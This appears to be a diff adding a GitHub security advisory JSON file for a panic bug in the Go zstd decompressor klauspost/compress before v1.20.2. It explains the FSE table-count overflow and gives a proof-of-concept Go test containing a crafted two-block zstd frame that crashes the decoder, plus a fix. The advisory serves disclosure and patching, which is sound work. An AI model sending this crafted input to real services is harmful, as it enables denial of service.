@@ -1,0 +1,58 @@
+{
+  "id": "GHSA-fpmh-frq8-7rj8",
+  "modified": "2026-10-27T15:47:24.256588090Z",
+  "published": "2026-10-27T15:38:14Z",
+  "aliases": [
+    "CVE-2026-116591"
+  ],
+  "summary": "compress zstd: Panic on two-block frames",
+  "details": "### Summary\n\nA crafted ~27 KB two-block zstd frame makes DecodeAll and the streaming decoder panic with an out-of-range slice index instead of returning a decode error. The same bytes decode fine with the reference zstd. Any program that decompresses untrusted zstd input can be crashed by it. Reproduced on v1.20.0 and v1.20.1.\n\nReleased in https://github.com/klauspost/compress/releases/tag/v1.20.2\n\n### Details\n\n The panic is in the FSE decoder that `huff0.ReadTable` uses to read a block's Huffman-weight table. Three conditions have to hold at once, and the crafted frame arranges all three.\n\n  **1. A count that doesn't fit is accepted.** `readNCount` permits a tableLog up to 15 ([`tablelogAbsoluteMax`](https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L9), checked at [`fse/decompress.go:54`](https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L54)), so a symbol's normalized count can reach 32768 (2^15). The count is stored in an `int16` at [`fse/decompress.go:126`](https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L126), where 32768 wraps to −32768. The validation only looks at the `int32` running totals (`remaining` and `gotTotal`), which still match, so the bad value passes. The crafted second block produces `norm = [0, -32768]`, `symbolLen = 2`.\n\n  **2. The decode table is built empty, with no error.** In `buildDtable`, −32768 isn't the −1 that flags a low-probability symbol, so it skips that branch, and the spread loop [`for i := 0; i \u003c int(v); i++`](https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L221) runs zero times for a negative `v`. `position` never advances, so the [`position != 0`](https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L230) guard passes as well.\n\n  **3. Stale state from the previous block is reused.** `huff0` shares one `fse.Scratch` across both blocks, and [`allocDtable`](https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L173-L189) reuses `decTable` and `ct.stateTable` without clearing them. So the table is rebuilt on top of block 1's symbols and `symbolNext` values. Many cells end up with `nbBits == 0`, because the leftover `nextState` is ≥ 32768.\n\n  At decode time, every symbol's count is below `largeLimit`, so `zeroBits` stays false and `decompress` takes the [`nextFast`](https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L371) path. On a cell with `nbBits == 0`, [`getBitsFast(0)`](https://github.com/klauspost/compress/blob/v1.20.0/fse/bitreader.go#L58-L63) shifts by `(64-0)\u002663 == 0` and returns the low 16 bits of the whole register instead of 0. The state runs past the end of the table, and [`d.dt[d.state]`](https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L372) panics:\n\n  ```\n  panic: runtime error: index out of range [33077] with length 32768\n  ```\n\n  Both blocks are needed. With a fresh `Scratch`, every cell would be symbol 0 with `symbolNext 0`, `highBits(0)` would underflow, `newState` would reach 32768, and the [`newState \u003e= tableSize`](https://github.com/klauspost/compress/blob/v1.20.0/fse/decompress.go#L246) guard would return an error. Block 1's leftover state is what carries the malformed table past that guard.\n\n  The underlying bug is the `int16` storage combined with a tableLog allowed to reach 15. The C reference uses `short` too, but caps the FSE tableLog at 12 and the Huffman-weight tableLog at 6, so the count never wraps. `huff0.ReadTable` doesn't enforce that 6-bit bound.\n\n  A fix: reject a count of `1\u003c\u003c15` (or `nbBits \u003e 14`) in `readNCount`, and enforce the weight-table tableLog in `huff0`. Clearing the reused table would also turn the panic into an error.\n\n\n### Proof of concept\n\nRun the following repro:\n\n```\npackage compression\n\nimport (\n\t\"bytes\"\n\t\"slices\"\n\t\"testing\"\n\n\t\"github.com/klauspost/compress/zstd\"\n\t\"github.com/stretchr/testify/require\"\n)\n\nfunc TestDecodeAll(t *testing.T) {\n\t// zstdFSEPanic is a crafted two-block zstd frame that makes\n\t// github.com/klauspost/compress (v1.20.0 and v1.20.1) panic with an\n\t// out-of-range index in fse.nextFast rather than returning an error. Cross-block\n\t// FSE table-state carryover lets the second block's malformed Huffman-weight\n\t// table pass the decoder's guard and overflow the decode table.\n\tzstdFSEPanic := slices.Concat(\n\t\t[]byte{0x28, 0xb5, 0x2f, 0xfd, 0x00, 0x38, 0x74, 0x06, 0x00, 0x42, 0xb8, 0x32, 0x0d, 0x1a, 0x00, 0x00, 0x00, 0x90, 0xaf, 0xfa, 0xff, 0x03, 0x00, 0x80, 0xff, 0x7f},\n\t\tbytes.Repeat([]byte{0xa5, 0x94, 0x52, 0x4a, 0x29}, 37),\n\t\t[]byte{0xa5, 0x94, 0x12, 0x00, 0xad, 0x56, 0x03, 0xee, 0xff, 0xdf, 0xb3, 0x1a, 0x1c, 0x1a, 0x00, 0xe0, 0xff, 0x1f, 0x0f, 0xb1, 0x9c, 0x5a, 0xcf, 0x4d, 0xe4, 0x1d, 0x7b, 0xab, 0x99, 0x5e, 0x01, 0x51, 0xa4, 0x73, 0xd8, 0xb1, 0xf3, 0x39, 0x4b, 0x67, 0xf6, 0xab, 0x1a, 0xab, 0x1a, 0xab, 0x1a},\n\t\tbytes.Repeat([]byte{0x8c, 0x31, 0xc6, 0x18, 0x63}, 1365),\n\t\t[]byte{0x8c, 0x31},\n\t\tbytes.Repeat([]byte{0x63, 0x8c, 0x31, 0xc6, 0x18}, 1365),\n\t\t[]byte{0x63, 0x2c},\n\t\tbytes.Repeat([]byte{0x31, 0xc6, 0x18, 0x63, 0x8c}, 1365),\n\t\t[]byte{0x31, 0x46},\n\t\tbytes.Repeat([]byte{0x31, 0xc6, 0x18, 0x63, 0x8c}, 1365),\n\t\t[]byte{0x31, 0x06, 0x00},\n\t)\n\n\tdecoder, err := zstd.NewReader(nil)\n\trequire.NoError(t, err)\n\n\tdst := make([]byte, 100*1024)\n\t_, err = decoder.DecodeAll(zstdFSEPanic, dst)\n\trequire.NoError(t, err)\n}\n```\n\nOutputs:\n```\npanic: runtime error: index out of range [33077] with length 32768 [recovered, repanicked]\n\ngoroutine 36 [running]:\ntesting.tRunner.func1.2({0x100c2b7c0, 0x2472599b62a0})\n\t/Users/joshua.kim/golang/pkg/mod/golang.org/toolchain@v0.0.1-go1.26.8.darwin-arm64/src/testing/testing.go:1974 +0x1a0\ntesting.tRunner.func1()\n\t/Users/joshua.kim/golang/pkg/mod/golang.org/toolchain@v0.0.1-go1.26.8.darwin-arm64/src/testing/testing.go:1977 +0x318\npanic({0x100c2b7c0?, 0x2472599b62a0?})\n\t/Users/joshua.kim/golang/pkg/mod/golang.org/toolchain@v0.0.1-go1.26.8.darwin-arm64/src/runtime/panic.go:860 +0x12c\ngithub.com/klauspost/compress/fse.(*decoder).nextFast(...)\n\t/Users/joshua.kim/golang/pkg/mod/github.com/klauspost/compress@v1.20.0/fse/decompress.go:372\ngithub.com/klauspost/compress/fse.(*Scratch).decompress(0x247259981008)\n\t/Users/joshua.kim/golang/pkg/mod/github.com/klauspost/compress@v1.20.0/fse/decompress.go:280 +0xa08\ngithub.com/klauspost/compress/fse.Decompress({0x247259ab60e0?, 0x0?, 0x0?}, 0x1007c839c?)\n\t/Users/joshua.kim/golang/pkg/mod/github.com/klauspost/compress@v1.20.0/fse/decompress.go:33 +0x64\ngithub.com/klauspost/compress/huff0.ReadTable({0x247259ab60df, 0x6acf, 0x6f21}, 0x1007899f8?)\n\t/Users/joshua.kim/golang/pkg/mod/github.com/klauspost/compress@v1.20.0/huff0/decompress.go:61 +0x130\ngithub.com/klauspost/compress/zstd.(*blockDec).decodeLiterals(0x247259aa42d0, {0x247259ab60da?, 0x19384?, 0x20000?}, 0x247259a9a958)\n\t/Users/joshua.kim/golang/pkg/mod/github.com/klauspost/compress@v1.20.0/zstd/blockdec.go:446 +0x550\ngithub.com/klauspost/compress/zstd.(*blockDec).decodeCompressed(0x247259aa42d0, 0x247259a9a958)\n\t/Users/joshua.kim/golang/pkg/mod/github.com/klauspost/compress@v1.20.0/zstd/blockdec.go:480 +0x34\ngithub.com/klauspost/compress/zstd.(*blockDec).decodeBuf(0x247259aa42d0, 0x247259a9a958)\n\t/Users/joshua.kim/golang/pkg/mod/github.com/klauspost/compress@v1.20.0/zstd/blockdec.go:256 +0x20c\ngithub.com/klauspost/compress/zstd.(*frameDec).runDecoder(0x247259a9a908, {0x247259ac6000?, 0x19000, 0x129ca3800?}, 0x247259aa42d0)\n\t/Users/joshua.kim/golang/pkg/mod/github.com/klauspost/compress@v1.20.0/zstd/framedec.go:371 +0x170\ngithub.com/klauspost/compress/zstd.(*Decoder).DecodeAll(0x247259aa41e0, {0x247259ab6000, 0x6baf, 0x7000}, {0x247259ac6000, 0x19000, 0x19000})\n\t/Users/joshua.kim/golang/pkg/mod/github.com/klauspost/compress@v1.20.0/zstd/decoder.go:395 +0x410\ngithub.com/ava-labs/avalanchego/utils/compression.TestDecodeAll(0x247259a9a6c8)\n\t/Users/joshua.kim/workspace/avalanchego/utils/compression/zstd_fse_panic_test.go:40 +0x498\ntesting.tRunner(0x247259a9a6c8, 0x100c4ae80)\n\t/Users/joshua.kim/golang/pkg/mod/golang.org/toolchain@v0.0.1-go1.26.8.darwin-arm64/src/testing/testing.go:2036 +0xc4\ncreated by testing.(*T).Run in goroutine 1\n\t/Users/joshua.kim/golang/pkg/mod/golang.org/toolchain@v0.0.1-go1.26.8.darwin-arm64/src/testing/testing.go:2101 +0x3a8\n```\n\n### Impact\n\nThis is a panic that callers cannot guard against with error handling. This should be a DOS for most users.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/klauspost/compress/zstd",
+        "purl": "pkg:golang/github.com/klauspost/compress/zstd"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.20.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.20.1",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-fpmh-frq8-7rj8/GHSA-fpmh-frq8-7rj8.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/klauspost/compress/security/advisories/GHSA-fpmh-frq8-7rj8"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-116591"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/klauspost/compress/commit/7f5d8528720c895a6106f201719f87eb030a565d"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/klauspost/compress"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/klauspost/compress/releases/tag/v1.20.2"
+    }
+  ]
+}
